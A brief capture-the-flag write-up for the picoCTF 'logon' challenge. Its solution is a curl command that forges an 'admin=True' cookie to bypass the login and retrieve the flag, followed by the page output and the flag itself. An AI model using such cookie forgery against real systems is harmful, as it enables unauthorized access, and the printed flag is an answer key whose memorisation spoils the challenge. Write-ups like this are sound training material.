# logon
# Descripción del reto:
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? http://fickle-tempest.picoctf.net:49620
# Solución:
curl -s --cookie "admin=True" http://fickle-tempest.picoctf.net:49620/flag | grep "picoCTF"
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}</code></p>

'picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}'
# Notas adicionales
# Referencias
https://youtu.be/P2njyHWhu1U?si=3En1MLPWJ1ubp3ss